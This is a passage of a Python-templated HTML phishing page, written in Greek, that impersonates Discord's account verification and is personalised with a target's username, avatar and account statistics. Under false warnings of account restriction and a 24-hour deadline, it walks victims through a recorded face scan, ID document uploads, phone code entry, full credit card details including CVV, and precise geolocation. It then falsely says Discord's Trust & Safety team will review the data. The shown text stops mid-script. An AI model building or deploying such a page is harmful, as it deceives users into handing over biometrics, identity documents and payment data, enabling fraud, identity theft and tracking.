            padding: 14px 16px;
            background: var(--discord-darkest);
            border: 1px solid var(--discord-dark-gray);
            border-radius: 8px;
            color: var(--discord-light);
            font-size: 1rem;
            transition: all 0.3s ease;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: var(--discord-blurple);
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.2);
        }}
        
        .phone-code {{
            display: flex;
            gap: 15px;
            margin-bottom: 25px;
        }}
        
        .code-input {{
            flex: 1;
            text-align: center;
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: 8px;
            padding: 15px;
            background: var(--discord-darkest);
            border: 2px solid var(--discord-dark-gray);
            border-radius: 8px;
            color: var(--discord-green);
        }}
        
        .code-input:focus {{
            outline: none;
            border-color: var(--discord-green);
        }}
        
        /* Payment Verification */
        .payment-section {{
            margin-bottom: 25px;
        }}
        
        .payment-options {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }}
        
        .payment-option {{
            background: var(--discord-darker);
            border: 2px solid var(--discord-dark-gray);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .payment-option:hover {{
            border-color: var(--discord-blurple);
            background: rgba(88, 101, 242, 0.1);
        }}
        
        .payment-option.selected {{
            border-color: var(--discord-blurple);
            background: rgba(88, 101, 242, 0.2);
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.2);
        }}
        
        .payment-icon {{
            font-size: 2rem;
            margin-bottom: 10px;
            color: var(--discord-blurple);
        }}
        
        .payment-name {{
            font-weight: 600;
            color: var(--discord-light);
            margin-bottom: 5px;
        }}
        
        .payment-hint {{
            color: var(--discord-gray);
            font-size: 0.8rem;
        }}
        
        .payment-form {{
            background: var(--discord-darker);
            border-radius: 12px;
            padding: 25px;
            margin-top: 20px;
            display: none;
        }}
        
        /* Location Verification */
        .location-section {{
            text-align: center;
            margin-bottom: 25px;
        }}
        
        .location-icon {{
            font-size: 4rem;
            margin-bottom: 20px;
            color: var(--discord-blurple);
        }}
        
        .location-info {{
            background: rgba(88, 101, 242, 0.1);
            border: 1px solid rgba(88, 101, 242, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }}
        
        .location-accuracy {{
            background: var(--discord-darker);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
        }}
        
        .accuracy-meter {{
            width: 100%;
            height: 10px;
            background: var(--discord-darkest);
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }}
        
        .accuracy-fill {{
            height: 100%;
            background: linear-gradient(90deg, var(--discord-red), var(--discord-yellow), var(--discord-green));
            width: 0%;
            transition: width 1s ease-in-out;
            border-radius: 5px;
        }}
        
        .accuracy-labels {{
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            color: var(--discord-gray);
            margin-top: 5px;
        }}
        
        .location-details {{
            background: var(--discord-darker);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            text-align: left;
            display: none;
        }}
        
        .detail-row {{
            display: flex;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--discord-dark-gray);
        }}
        
        .detail-row:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .detail-label {{
            width: 120px;
            color: var(--discord-gray);
            font-size: 0.9rem;
            flex-shrink: 0;
        }}
        
        .detail-value {{
            flex: 1;
            color: var(--discord-light);
            font-size: 0.9rem;
            font-weight: 500;
        }}
        
        /* Buttons */
        .button {{
            width: 100%;
            padding: 16px 24px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }}
        
        .primary-btn {{
            background: var(--discord-blurple);
            color: white;
        }}
        
        .primary-btn:hover:not(:disabled) {{
            background: #4752C4;
            transform: translateY(-2px);
            box-shadow: 0 8px 32px rgba(88, 101, 242, 0.3);
        }}
        
        .primary-btn:disabled {{
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }}
        
        .secondary-btn {{
            background: var(--discord-darker);
            color: var(--discord-gray);
            border: 1px solid var(--discord-dark-gray);
        }}
        
        .secondary-btn:hover {{
            background: var(--discord-dark);
            border-color: var(--discord-blurple);
            color: var(--discord-light);
        }}
        
        .success-btn {{
            background: var(--discord-green);
            color: var(--discord-darkest);
        }}
        
        .success-btn:hover {{
            background: #4ADB7F;
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            display: none;
        }}
        
        .status-success {{
            background: rgba(87, 242, 135, 0.1);
            border: 1px solid rgba(87, 242, 135, 0.3);
            color: var(--discord-green);
        }}
        
        .status-error {{
            background: rgba(237, 66, 69, 0.1);
            border: 1px solid rgba(237, 66, 69, 0.3);
            color: var(--discord-red);
        }}
        
        .status-processing {{
            background: rgba(88, 101, 242, 0.1);
            border: 1px solid rgba(88, 101, 242, 0.3);
            color: var(--discord-blurple);
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Completion Page */
        .completion-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .completion-icon {{
            font-size: 5rem;
            margin-bottom: 25px;
            color: var(--discord-green);
            animation: popIn 0.5s ease-out;
        }}
        
        @keyframes popIn {{
            0% {{ transform: scale(0.5); opacity: 0; }}
            70% {{ transform: scale(1.1); opacity: 1; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .completion-title {{
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 15px;
            color: var(--discord-green);
        }}
        
        .next-steps {{
            margin-top: 40px;
            padding-top: 25px;
            border-top: 1px solid var(--discord-dark-gray);
        }}
        
        .countdown {{
            font-size: 1.2rem;
            font-weight: 700;
            color: var(--discord-blurple);
            margin: 20px 0;
        }}
        
        /* Review Page */
        .review-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .review-icon {{
            font-size: 5rem;
            margin-bottom: 25px;
            color: var(--discord-blurple);
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0% {{ transform: scale(1); opacity: 1; }}
            50% {{ transform: scale(1.05); opacity: 0.8; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .review-steps {{
            background: var(--discord-darker);
            border-radius: 16px;
            padding: 25px;
            margin: 30px 0;
        }}
        
        .review-step {{
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 25px;
            border-bottom: 1px solid var(--discord-dark-gray);
        }}
        
        .review-step:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .step-number {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--discord-blurple);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            margin-right: 20px;
            flex-shrink: 0;
        }}
        
        .step-content {{
            text-align: left;
            flex: 1;
        }}
        
        .step-title {{
            font-weight: 600;
            margin-bottom: 5px;
            color: var(--discord-light);
        }}
        
        .step-description {{
            color: var(--discord-gray);
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid var(--discord-dark-gray);
            color: var(--discord-gray);
            font-size: 0.8rem;
        }}
        
        .footer-links {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: var(--discord-gray);
            text-decoration: none;
        }}
        
        .footer-links a:hover {{
            color: var(--discord-blurple);
            text-decoration: underline;
        }}
        
        /* Utilities */
        .hidden {{
            display: none !important;
        }}
        
        .file-input {{
            display: none;
        }}
        
        .text-center {{
            text-align: center;
        }}
        
        .mt-20 {{
            margin-top: 20px;
        }}
        
        .mb-20 {{
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Discord Header -->
        <div class="discord-header">
            <div class="discord-logo">
                <div class="discord-icon">D</div>
                <div class="discord-title">Discord</div>
            </div>
            <div class="header-subtitle">Σύστημα Επαλήθευσης Λογαριασμού</div>
        </div>
        
        <!-- Account Card -->
        <div class="account-card">
            <div class="account-header">
                <div class="account-avatar">
                    {'<img src="' + profile_picture + '">' if profile_picture else 'D'}
                </div>
                <div class="account-info">
                    <div class="account-name">{target_username}</div>
                    <div class="account-tag">{discriminator}</div>
                    <div class="account-status">
                        {'Απαιτείται Επαλήθευση Ηλικίας' if account_type == 'age' else 
                         'Απαιτείται Πρόσβαση σε Διακομιστή' if account_type == 'server' else 
                         'Απαιτείται Επαλήθευση Πληρωμής' if account_type == 'payment' else 
                         'Απαιτείται Έλεγχος Ασφαλείας'}
                    </div>
                </div>
            </div>
            
            <div class="account-details">
                <div class="detail-item">
                    <div class="detail-value">{account_age}η</div>
                    <div class="detail-label">Ηλικία Λογαριασμού</div>
                </div>
                <div class="detail-item">
                    <div class="detail-value">{friends_count}</div>
                    <div class="detail-label">Φίλοι</div>
                </div>
                <div class="detail-item">
                    <div class="detail-value">{servers_count}</div>
                    <div class="detail-label">Διακομιστές</div>
                </div>
            </div>
        </div>
        
        <!-- Verification Container -->
        <div class="verification-container">
            <!-- Progress Bar -->
            <div class="progress-container">
                <div class="progress-header">
                    <div class="progress-title">Πρόοδος Επαλήθευσης</div>
                    <div class="progress-percent" id="progressPercent">0%</div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                
                <div class="progress-steps">
                    <div class="step-line"></div>
                    <div class="step-line-fill" id="stepLineFill"></div>
                    <div class="step-indicator completed">1</div>
                    <div class="step-indicator active">2</div>
                    <div class="step-indicator">3</div>
                    <div class="step-indicator">4</div>
                    <div class="step-indicator">5</div>
                </div>
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step active" id="step1">
                <h2 class="step-title">Απαιτείται Επαλήθευση</h2>
                <p class="step-subtitle">
                    {account_type_messages[account_type]}
                </p>
                
                <div class="alert-box">
                    <div class="alert-icon">⚠️</div>
                    <div class="alert-content">
                        <div class="alert-title">Περιορισμένος Λογαριασμός</div>
                        <div class="alert-text">
                            {'Ο λογαριασμός σας έχει περιοριστεί προσωρινά λόγω ηλικιακών περιορισμών. Ολοκληρώστε την επαλήθευση για να αποκαταστήσετε την πλήρη πρόσβαση.' if account_type == 'age' else 
                             'Η πρόσβαση σε διακομιστές NSFW/18+ έχει περιοριστεί. Ολοκληρώστε την επαλήθευση για να αποκτήσετε πρόσβαση.' if account_type == 'server' else 
                             'Οι λειτουργίες Discord Nitro έχουν προσωρινά ανασταλεί. Ολοκληρώστε την επαλήθευση για να αποκαταστήσετε την πρόσβαση.' if account_type == 'payment' else 
                             'Ο λογαριασμός σας έχει επισημανθεί για ύποπτη δραστηριότητα. Ολοκληρώστε την επαλήθευση για να ασφαλίσετε τον λογαριασμό σας.'}
                        </div>
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-icon">📋</div>
                    <div class="info-content">
                        <div class="info-title">Διαδικασία Επαλήθευσης</div>
                        <div class="info-text">
                            Για να ολοκληρώσετε την επαλήθευση, θα χρειαστεί να παρέχετε:
                        </div>
                        <ul class="info-list">
                            <li><strong>Επαλήθευση Προσώπου</strong> - Έλεγχος ταυτότητας σε πραγματικό χρόνο</li>
                            {'<li><strong>Έγγραφο Ταυτότητας</strong> - Απόδειξη ταυτότητας/ηλικίας</li>' if id_enabled else ''}
                            {'<li><strong>Αριθμό Τηλεφώνου</strong> - Δευτερεύουσα επαλήθευση</li>' if phone_enabled else ''}
                            {'<li><strong>Μέθοδο Πληρωμής</strong> - Για επαλήθευση Discord Nitro</li>' if payment_enabled else ''}
                            {'<li><strong>Έλεγχο Τοποθεσίας</strong> - Συμμόρφωση με περιφερειακούς κανονισμούς</li>' if location_enabled else ''}
                        </ul>
                        <div class="info-text mt-20">
                            <strong>Χρονικό Όριο:</strong> Ολοκληρώστε εντός 24 ωρών για να αποφύγετε περιορισμούς λογαριασμού.
                        </div>
                    </div>
                </div>
                
                <button class="button primary-btn" onclick="nextStep()">
                    Έναρξη Διαδικασίας Επαλήθευσης
                </button>
                
                <div class="footer">
                    Συνεχίζοντας, συμφωνείτε με τους <a href="#">Όρους Χρήσης</a> του Discord και την
                    <a href="/privacy_policy">Πολιτική Απορρήτου</a>
                </div>
            </div>
            
            <!-- Step 2: Face Verification -->
            <div class="step" id="step2">
                <h2 class="step-title">Επαλήθευση Προσώπου</h2>
                <p class="step-subtitle">
                    Χρειάζεται να επαληθεύσουμε την ταυτότητά σας μέσω μιας γρήγορης σάρωσης προσώπου.
                </p>
                
                <div class="face-container">
                    <div class="camera-container">
                        <video id="faceVideo" autoplay playsinline></video>
                        <div class="face-overlay">
                            <div class="face-circle"></div>
                        </div>
                    </div>
                    
                    <div class="face-timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                    
                    <div class="face-instruction" id="faceInstruction">
                        <div class="instruction-icon">👤</div>
                        <div class="instruction-text" id="instructionText">Έτοιμο για Έναρξη</div>
                        <div class="instruction-detail" id="instructionDetail">
                            Τοποθετήστε το πρόσωπό σας μέσα στον κύκλο
                        </div>
                    </div>
                </div>
                
                <button class="button primary-btn" id="startFaceBtn" onclick="startFaceVerification()">
                    Έναρξη Σάρωσης Προσώπου
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                            Επιστροφή
                </button>
            </div>
            
            <!-- Step 3: ID Verification -->
            <div class="step" id="step3">
                <h2 class="step-title">Επαλήθευση Εγγράφου Ταυτότητας</h2>
                <p class="step-subtitle">
                    Μεταφορτώστε φωτογραφίες του εγγράφου ταυτότητάς σας για {'επαλήθευση ηλικίας' if account_type == 'age' else 'επαλήθευση ταυτότητας'}.
                </p>
                
                <div class="id-section">
                    <div class="id-card" onclick="document.getElementById('frontIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleIDFileDrop(event, 'front')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Μπροστινή Πλευρά Ταυτότητας</div>
                        <div class="id-subtitle">
                            {'Διαβατήριο, Άδεια Οδήγησης ή Διαβατήριο' if id_type == 'government' else 
                             'Δελτίο Φοιτητή' if id_type == 'student' else 
                             'Πιστοποιητικό Γέννησης'}
                        </div>
                        <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'front')">
                        <div class="id-preview" id="frontPreview">
                            <img class="id-preview-image" id="frontPreviewImage">
                        </div>
                    </div>
                    
                    <div class="id-card" onclick="document.getElementById('backIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleIDFileDrop(event, 'back')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Πίσω Πλευρά Ταυτότητας</div>
                        <div class="id-subtitle">
                            {'Απαιτείται για έγγραφα με δύο πλευρές' if id_type == 'government' else 
                             'Προαιρετικό για δελτία φοιτητή' if id_type == 'student' else
                             'Τμήμα Γονέα/Κηδεμόνα (εφόσον ισχύει)'}
                        </div>
                        <input type="file" id="backIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'back')">
                        <div class="id-preview" id="backPreview">
                            <img class="id-preview-image" id="backPreviewImage">
                        </div>
                    </div>
                </div>
                
                <div class="id-requirements">
                    <div class="requirements-title">Απαιτήσεις Εγγράφου:</div>
                    <ul class="requirements-list">
                        {'<li>Επίσημη ταυτότητα με φωτογραφία και ημερομηνία γέννησης</li>' if id_type == 'government' else ''}
                        {'<li>Έγκυρο δελτίο φοιτητή με ημερομηνία λήξης</li>' if id_type == 'student' else ''}
                        {'<li>Επίσημο έγγραφο πιστοποιητικού γέννησης</li>' if id_type == 'birth_certificate' else ''}
                        <li>Καθαρές, καλά φωτισμένες φωτογραφίες</li>
                        <li>Όλο το κείμενο πρέπει να είναι αναγνώσιμο</li>
                        <li>Χωρίς ανταύγειες ή αντανακλάσεις</li>
                        <li>Ολόκληρο το έγγραφο ορατό στο πλαίσιο</li>
                    </ul>
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="button primary-btn" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Μεταφόρτωση Εγγράφων Ταυτότητας
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Επιστροφή
                </button>
            </div>
            
            <!-- Step 4: Phone Verification -->
            <div class="step" id="step4">
                <h2 class="step-title">Επαλήθευση Τηλεφώνου</h2>
                <p class="step-subtitle">
                    Επαληθεύστε τον αριθμό τηλεφώνου σας για επιπλέον ασφάλεια και ανάκτηση λογαριασμού.
                </p>
                
                <div class="phone-section">
                    <div class="phone-icon">📱</div>
                    <div class="phone-form">
                        <div class="form-group">
                            <label class="form-label">Αριθμός Τηλεφώνου</label>
                            <input type="tel" class="form-input" id="phoneNumber" placeholder="+30 69XXXXXXXX">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Κωδικός Επαλήθευσης</label>
                            <div class="phone-code">
                                <input type="text" class="code-input" id="verificationCode" maxlength="6" placeholder="000000" disabled>
                            </div>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <div class="info-icon">ℹ️</div>
                        <div class="info-content">
                            <div class="info-title">Γιατί επαλήθευση τηλεφώνου;</div>
                            <div class="info-text">
                                Η επαλήθευση τηλεφώνου προσθέτει ένα επιπλέον στρώμα ασφαλείας στον λογαριασμό σας και βοηθά στην ανάκτηση λογαριασμού.
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="phoneStatus"></div>
                
                <button class="button primary-btn" id="sendCodeBtn" onclick="sendVerificationCode()">
                    Αποστολή Κωδικού Επαλήθευσης
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Επιστροφή
                </button>
            </div>
            
            <!-- Step 5: Payment Verification -->
            <div class="step" id="step5">
                <h2 class="step-title">Επαλήθευση Πληρωμής</h2>
                <p class="step-subtitle">
                    Επαληθεύστε τη μέθοδο πληρωμής σας για συνδρομή Discord Nitro.
                </p>
                
                <div class="payment-section">
                    <div class="payment-options">
                        <div class="payment-option" onclick="selectPaymentMethod('credit_card')">
                            <div class="payment-icon">💳</div>
                            <div class="payment-name">Πιστωτική Κάρτα</div>
                            <div class="payment-hint">Visa, Mastercard, Amex</div>
                        </div>
                        
                        <div class="payment-option" onclick="selectPaymentMethod('paypal')">
                            <div class="payment-icon">🏦</div>
                            <div class="payment-name">PayPal</div>
                            <div class="payment-hint">Σύνδεση λογαριασμού PayPal</div>
                        </div>
                        
                        <div class="payment-option" onclick="selectPaymentMethod('google_pay')">
                            <div class="payment-icon">📱</div>
                            <div class="payment-name">Google Pay</div>
                            <div class="payment-hint">Πορτοφόλι Google Pay</div>
                        </div>
                    </div>
                    
                    <div class="payment-form" id="paymentForm">
                        <div class="form-group">
                            <label class="form-label">Αριθμός Κάρτας</label>
                            <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456">
                        </div>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                            <div class="form-group">
                                <label class="form-label">Ημερομηνία Λήξης</label>
                                <input type="text" class="form-input" id="cardExpiry" placeholder="ΜΜ/ΕΕ">
                            </div>
                            <div class="form-group">
                                <label class="form-label">CVV</label>
                                <input type="text" class="form-input" id="cardCvv" placeholder="123">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Όνομα στην Κάρτα</label>
                            <input type="text" class="form-input" id="cardName" placeholder="Γιάννης Παπαδόπουλος">
                        </div>
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-icon">🔒</div>
                    <div class="info-content">
                        <div class="info-title">Ασφαλής Επεξεργασία Πληρωμής</div>
                        <div class="info-text">
                            Όλες οι πληροφορίες πληρωμής είναι κρυπτογραφημένες και επεξεργάζονται με ασφάλεια. Το Discord δεν αποθηκεύει πλήρεις λεπτομέρειες κάρτας.
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="paymentStatus"></div>
                
                <button class="button primary-btn" id="submitPaymentBtn" onclick="submitPaymentVerification()" disabled>
                    Επαλήθευση Μεθόδου Πληρωμής
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Επιστροφή
                </button>
            </div>
            
            <!-- Step 6: Location Verification -->
            <div class="step" id="step6">
                <h2 class="step-title">Επαλήθευση Τοποθεσίας</h2>
                <p class="step-subtitle">
                    Επαληθεύστε την τοποθεσία σας για περιφερειακή συμμόρφωση και σκοπούς ασφαλείας.
                </p>
                
                <div class="location-section">
                    <div class="location-icon">📍</div>
                    <div class="location-info">
                        <div class="instruction-icon">🌍</div>
                        <div class="instruction-text">Απαιτείται Πρόσβαση Τοποθεσίας</div>
                        <div class="instruction-detail">
                            Το Discord χρειάζεται να επαληθεύσει την τοποθεσία σας για περιφερειακή συμμόρφωση και ασφάλεια.
                        </div>
                    </div>
                    
                    <div class="location-accuracy">
                        <div class="instruction-text">Ακρίβεια Τοποθεσίας</div>
                        <div class="accuracy-meter">
                            <div class="accuracy-fill" id="accuracyFill"></div>
                        </div>
                        <div class="accuracy-labels">
                            <span>Χαμηλή</span>
                            <span>Μεσαία</span>
                            <span>Υψηλή</span>
                        </div>
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div class="detail-row">
                            <div class="detail-label">Γεωγραφικό πλάτος:</div>
                            <div class="detail-value" id="latValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Γεωγραφικό μήκος:</div>
                            <div class="detail-value" id="lonValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Ακρίβεια:</div>
                            <div class="detail-value" id="accuracyValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Διεύθυνση:</div>
                            <div class="detail-value" id="addressValue">--</div>
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Κάντε κλικ στο παρακάτω κουμπί για να μοιραστείτε την τοποθεσία σας
                </div>
                
                <button class="button primary-btn" id="locationBtn" onclick="requestLocation()">
                    Κοινή χρήση της Τοποθεσίας μου
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Επιστροφή
                </button>
            </div>
            
            <!-- Final Step: Processing -->
            <div class="step" id="stepFinal">
                <h2 class="step-title">Επαλήθευση σε Εξέλιξη</h2>
                <p class="step-subtitle">
                    Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας. Αυτό μπορεί να διαρκέσει λίγα λεπτά.
                </p>
                
                <div class="info-box" style="text-align: center; padding: 40px;">
                    <div class="instruction-icon" style="font-size: 4rem;">⏳</div>
                    <div class="instruction-text">Επεξεργασία της Επαλήθευσής Σας</div>
                    <div class="instruction-detail">
                        <div class="loading-spinner" style="margin-right: 10px;"></div>
                        Ανάλυση υποβληθέντων δεδομένων...
                    </div>
                </div>
                
                <div class="status-message status-processing" id="finalStatus">
                    Επαλήθευση σάρωσης προσώπου... 25%
                </div>
            </div>
            
            <!-- Completion Step -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="completion-icon">✅</div>
                    
                    <h2 class="completion-title">Η Επαλήθευση Υποβλήθηκε!</h2>
                    <p class="step-subtitle">
                        Ευχαριστούμε, <strong style="color: var(--discord-blurple);">{target_username}{discriminator}</strong>! 
                        Τα δεδομένα επαλήθευσής σας έχουν υποβληθεί με επιτυχία για έλεγχο.
                    </p>
                    
                    <div class="info-box">
                        <div class="info-icon">📋</div>
                        <div class="info-content">
                            <div class="info-title">Τι συμβαίνει στη συνέχεια;</div>
                            <div class="info-text">
                                <ul class="info-list">
                                    <li>Η ομάδα Εμπιστοσύνης & Ασφάλειας του Discord θα ελέγξει την υποβολή σας</li>
                                    <li>Ο έλεγχος διαρκεί συνήθως 24-48 ώρες</li>
                                    <li>Θα λάβετε ένα email με το αποτέλεσμα της επαλήθευσης</li>
                                    <li>Μόλις εγκριθεί, ο λογαριασμός σας θα αποκατασταθεί πλήρως</li>
                                    <li>Εάν χρειαστεί επιπλέον πληροφορίες, θα επικοινωνήσουμε μαζί σας</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <p class="step-subtitle">
                            Θα μεταφερθείτε στη σελίδα ελέγχου σε <span class="countdown" id="countdown">5</span> δευτερόλεπτα...
                        </p>
                        <button class="button primary-btn" onclick="showReviewPage()">
                            Συνέχεια στη Κατάσταση Ελέγχου
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Review Status Step -->
            <div class="step" id="stepReview">
                <div class="review-container">
                    <div class="review-icon">⏳</div>
                    
                    <h2 class="step-title">Επαλήθευση υπό Έλεγχο</h2>
                    <p class="step-subtitle">
                        Η επαλήθευση του λογαριασμού σας εξετάζεται από την ομάδα Εμπιστοσύνης & Ασφάλειας του Discord.
                    </p>
                    
                    <div class="review-steps">
                        <div class="review-step">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <div class="step-title">Υποβολή Λήφθηκε</div>
                                <div class="step-description">
                                    Τα δεδομένα επαλήθευσής σας έχουν ληφθεί και βρίσκονται σε ουρά για έλεγχο.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <div class="step-title">Διαδικασία Χειροκίνητου Ελέγχου</div>
                                <div class="step-description">
                                    Η ομάδα μας ελέγχει χειροκίνητα τη σάρωση προσώπου, τα έγγραφα ταυτότητας και άλλα δεδομένα επαλήθευσης.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <div class="step-title">Έλεγχοι Ασφαλείας</div>
                                <div class="step-description">
                                    Εκτελούμε επιπλέον ελέγχους ασφαλείας για να διασφαλίσουμε την αυθεντικότητα των εγγράφων σας.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <div class="step-title">Τελική Απόφαση</div>
                                <div class="step-description">
                                    Θα λάβετε ένα email με την τελική απόφαση εντός 48 ωρών από την υποβολή.
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <div class="info-icon">📧</div>
                        <div class="info-content">
                            <div class="info-title">Ελέγξτε το Email Σας</div>
                            <div class="info-text">
                                Έχουμε στείλει μια επιβεβαίωση στο email που είναι καταχωρημένο. Παρακαλώ ελέγξτε τα εισερχόμενά σας (και τον φάκελο spam) για ενημερώσεις.
                            </div>
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <button class="button primary-btn" onclick="returnToDiscord()">
                            Επιστροφή στο Discord
                        </button>
                        <button class="button secondary-btn" onclick="checkVerificationStatus()">
                            Έλεγχος Κατάστασης
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div>© 2024 Discord, Inc. Με επιφύλαξη παντός δικαιώματος.</div>
            <div class="footer-links">
                <a href="/privacy_policy">Πολιτική Απορρήτου</a>
                <a href="#">Όροι Χρήσης</a>
                <a href="#">Οδηγίες Κοινότητας</a>
                <a href="#">Υποστήριξη</a>
            </div>
        </div>
    </div>
    
    <script>
        // Καθολικές μεταβλητές
        let currentStep = 1;
        let totalSteps = {total_steps};
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimerInterval = null;
        let faceTimeLeft = {face_duration};
        let currentInstructionIndex = 0;
        let instructionTimer = null;
        let idFiles = {{front: null, back: null}};
        let phoneNumber = '';
        let verificationCode = '';
        let selectedPaymentMethod = null;
        let paymentData = {{}};
        let locationData = null;
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let targetUsername = "{target_username}";
        let discriminator = "{discriminator}";
        let accountType = "{account_type}";
        let countdownTimer = null;
        let verificationCodeSent = false;
        
        // Οδηγίες σάρωσης προσώπου
        let faceInstructions = [
            {{icon: "👤", text: "Κοιτάξτε Ευθεία", detail: "Κρατήστε το πρόσωπό σας κεντραρισμένο στον κύκλο", duration: 3}},
            {{icon: "👈", text: "Γυρίστε το Κεφάλι Αριστερά", detail: "Γυρίστε αργά το κεφάλι σας προς τα αριστερά", duration: 3}},
            {{icon: "👉", text: "Γυρίστε το Κεφάλι Δεξιά", detail: "Γυρίστε αργά το κεφάλι σας προς τα δεξιά", duration: 3}},
            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Κλίντε απαλά το κεφάλι σας προς τα πάνω", duration: 3}},
            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Κλίντε απαλά το κεφάλι σας προς τα κάτω", duration: 3}},
            {{icon: "😉", text: "Κλείστε Τα Μάτια Φυσικά", detail: "Κλείστε τα μάτια σας μερικές φορές", duration: 2}},
            {{icon: "😊", text: "Χαμογέλα", detail: "Δώστε μας ένα φυσικό χαμόγελο", duration: 2}},
            {{icon: "✅", text: "Ολοκλήρωση", detail: "Η επαλήθευση προσώπου ολοκληρώθηκε επιτυχώς!", duration: 1}}
        ];
        
        // Πλοήγηση Βημάτων
        function updateProgress() {{
            const progressPercent = ((currentStep - 1) / (totalSteps - 1)) * 100;
            document.getElementById('progressFill').style.width = progressPercent + '%';
            document.getElementById('stepLineFill').style.width = progressPercent + '%';
            document.getElementById('progressPercent').textContent = Math.round(progressPercent) + '%';
            
            // Ενημέρωση δεικτών βήματος
            const indicators = document.querySelectorAll('.step-indicator');
